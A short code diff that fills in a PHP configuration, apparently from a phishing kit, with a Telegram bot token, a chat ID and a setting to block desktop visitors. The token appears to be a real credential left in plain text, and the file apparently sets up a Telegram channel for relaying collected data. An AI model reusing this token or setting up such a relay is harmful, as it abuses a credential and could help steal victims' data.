@@ -2,8 +2,8 @@
 
 
 
-$bot = "hat 9lawik hna";
-$chat_ids = array("hat sawtak hna");
+$bot = "8539470413:AAFRX2JQEm_hihY-bpA-tKVpg82RX9s3qV0";
+$chat_ids = array("-5121677658");
  
 // to block pc - on | off
 $block_pc = "off";
